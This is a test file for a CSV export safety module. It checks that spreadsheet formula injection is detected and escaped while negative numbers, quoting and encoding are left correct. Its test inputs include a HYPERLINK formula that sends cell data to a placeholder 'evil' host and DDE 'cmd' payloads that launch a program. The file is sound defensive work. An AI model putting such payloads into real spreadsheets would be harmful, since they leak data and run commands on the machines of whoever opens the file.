import { describe, expect, it } from "vitest";

import { escapeCsvCell, looksLikeFormula, toCsv } from "@/domain/csv-safety";

describe("looksLikeFormula", () => {
  it("catches the leading characters Excel evaluates", () => {
    expect(looksLikeFormula("=1+1")).toBe(true);
    expect(looksLikeFormula("@SUM(A1)")).toBe(true);
    expect(looksLikeFormula("\t=1+1")).toBe(true);
    expect(looksLikeFormula('=HYPERLINK("http://evil/?"&A1,"счёт")')).toBe(true);
    expect(looksLikeFormula("=cmd|'/c calc'!A1")).toBe(true);
  });

  it("leaves negative and signed numbers alone", () => {
    // The trap: `-` is on the dangerous list, so a naive check quotes every
    // negative number and every export of a loss-making service is mangled.
    expect(looksLikeFormula("-5")).toBe(false);
    expect(looksLikeFormula("-1 234,50")).toBe(false);
    expect(looksLikeFormula("+7")).toBe(false);
    expect(looksLikeFormula("-0.5")).toBe(false);
  });

  it("still catches an expression that opens like a number", () => {
    expect(looksLikeFormula("-1+cmd|'/c calc'!A1")).toBe(true);
    expect(looksLikeFormula("+1-2")).toBe(true);
  });

  it("ignores ordinary text and a lone dash", () => {
    expect(looksLikeFormula("Маникюр")).toBe(false);
    expect(looksLikeFormula("-")).toBe(false);
    expect(looksLikeFormula("")).toBe(false);
  });
});

describe("escapeCsvCell", () => {
  it("prefixes a formula so Excel reads it as text", () => {
    expect(escapeCsvCell("=1+1")).toBe("'=1+1");
  });

  it("quotes a cell containing the delimiter", () => {
    expect(escapeCsvCell("Маникюр; классический")).toBe('"Маникюр; классический"');
  });

  it("doubles embedded quotes", () => {
    expect(escapeCsvCell('Гель "Люкс"')).toBe('"Гель ""Люкс"""');
  });

  it("guards a formula that also needs quoting", () => {
    // Quoting alone is no defence — Excel evaluates a formula inside quotes.
    expect(escapeCsvCell('=HYPERLINK("x")')).toBe('"\'=HYPERLINK(""x"")"');
  });
});

describe("toCsv", () => {
  it("writes a BOM so Excel does not read UTF-8 as Windows-1251", () => {
    expect(toCsv([["Название"]])).toBe("﻿Название\r\n");
  });

  it("survives a round trip through the parser", async () => {
    const { parseCsv } = await import("@/domain/csv");
    const written = toCsv([
      ["name", "price"],
      ["=1+1", "-5"],
    ]);

    const parsed = parseCsv(new TextEncoder().encode(written));
    // The apostrophe is Excel's marker and stays in the raw bytes; what matters
    // is that the value never becomes a formula, and the number is untouched.
    expect(parsed.rows[0].cells).toEqual(["'=1+1", "-5"]);
  });
});
